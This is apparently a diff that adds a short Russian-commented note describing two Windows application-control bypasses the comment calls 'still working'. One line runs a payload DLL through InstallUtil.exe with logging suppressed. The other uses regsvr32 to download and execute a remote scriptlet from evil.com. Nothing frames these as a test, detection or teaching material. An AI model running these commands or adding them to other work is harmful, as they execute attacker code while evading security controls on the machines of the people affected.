@@ -1,0 +1,5 @@
+# Обход через InstallUtil (всё ещё работает)
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "C:\temp\payload.dll"
+
+# Или через regsvr32
+regsvr32.exe /s /u /i:http://evil.com/script.sct scrobj.dll
